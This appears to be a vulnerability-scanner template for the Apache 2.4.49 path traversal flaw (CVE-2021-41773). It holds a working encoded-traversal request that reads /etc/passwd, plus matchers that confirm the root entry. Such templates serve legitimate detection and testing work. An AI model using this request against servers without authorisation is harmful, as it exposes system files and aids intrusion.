id: apache-path-traversal-cve-2021-41773
info:
  name: Apache 2.4.49 Path Traversal
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied," these requests can succeed. This flaw could also leak the source of interpreted files like CGI scripts.
  tags: directory-traversal
  reference:
    - https://httpd.apache.org/security/vulnerabilities_24.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41773

variables:
  target_file: "etc/passwd"

http:
  - raw:
      - |
        GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/{{target_file}} HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
    extractors:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:.*"
